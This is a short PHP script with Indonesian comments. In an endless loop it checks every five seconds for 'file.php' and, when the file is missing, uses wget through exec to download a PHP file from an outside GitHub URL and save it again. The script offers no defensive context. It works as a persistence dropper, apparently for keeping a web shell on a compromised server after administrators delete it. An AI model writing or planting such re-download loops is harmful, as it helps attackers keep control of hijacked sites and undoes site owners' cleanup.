<?php
// URL file yang ingin diunduh
$url = 'https://raw.githubusercontent.com/PACKDOL/shallg16/refs/heads/main/Di%26De.php';
$filename = 'file.php'; // Nama file untuk disimpan

// Fungsi untuk mengunduh file menggunakan wget
function downloadFile($url, $filename) {
    // Menjalankan wget di latar belakang
    exec("wget -q $url -O $filename > /dev/null 2>&1 &");
}

// Loop untuk memeriksa keberadaan file
while (true) {
    // Cek apakah file ada
    if (!file_exists($filename)) {
        // Jika file tidak ada, unduh kembali
        echo "File '$filename' tidak ditemukan. Mengunduh kembali...\n";
        downloadFile($url, $filename);
    } else {
        echo "File '$filename' ditemukan.\n";
    }
    
    // Tunggu 5 detik sebelum memeriksa lagi
    sleep(5);
}
?>
